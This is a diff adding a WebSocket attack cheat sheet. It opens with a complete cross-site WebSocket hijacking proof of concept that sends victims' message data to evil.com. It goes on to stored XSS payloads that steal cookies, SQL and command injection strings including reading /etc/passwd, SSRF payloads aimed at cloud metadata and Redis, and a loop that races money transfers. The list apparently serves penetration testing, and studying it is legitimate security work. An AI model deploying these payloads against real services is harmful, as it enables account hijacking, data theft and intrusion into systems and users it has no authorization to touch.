@@ -1,0 +1,54 @@
+# ============================================================
+# WebSockets — Hijacking & Injection
+# ============================================================
+
+# ---- Full CSWSH PoC ----
+<html>
+<body>
+<script>
+var ws = new WebSocket('wss://TARGET.COM/chat');
+ws.onopen = function() {
+    ws.send('{"action":"getProfile"}');
+    ws.send('{"action":"listUsers"}');
+};
+ws.onmessage = function(e) {
+    new Image().src = 'https://evil.com/log?d=' + encodeURIComponent(e.data);
+};
+ws.onerror = function(e) {
+    new Image().src = 'https://evil.com/err';
+};
+</script>
+</body>
+</html>
+
+# ---- WebSocket with Cookie Auth ----
+# Browser sends cookies automatically on WS upgrade → no CSRF token needed
+# Bypass: if server only checks Origin (which we control) and Cookie
+
+# ---- Smuggle via HTTP Upgrade Confusion ----
+# Some reverse proxies don't validate WS upgrade properly
+# Try upgrading connection on non-WS endpoints
+
+# ---- Persistent XSS via WebSocket Message ----
+# If server broadcasts messages to all users:
+{"message":"<img src=x onerror=alert(document.cookie)>"}
+{"username":"</script><script>alert(1)</script>"}
+
+# ---- SQL/Command Injection via WS ----
+{"search":"admin' OR '1'='1"}
+{"cmd":"ls; cat /etc/passwd"}
+{"query":"admin\u0027 OR \u00271\u0027=\u00271"}
+
+# ---- SSRF via WebSocket ----
+# If server forwards WS message to internal service:
+{"url":"http://169.254.169.254/latest/meta-data/"}
+{"host":"localhost","port":6379,"data":"PING"}
+
+# ---- Race Condition via WebSocket ----
+# Send many concurrent messages:
+for(var i=0;i<100;i++) { ws.send('{"transfer":{"amount":1000}}'); }
+
+# ---- WS Subprotocol Confusion ----
+Sec-WebSocket-Protocol: binary
+Sec-WebSocket-Protocol: base64
+Sec-WebSocket-Protocol: soap
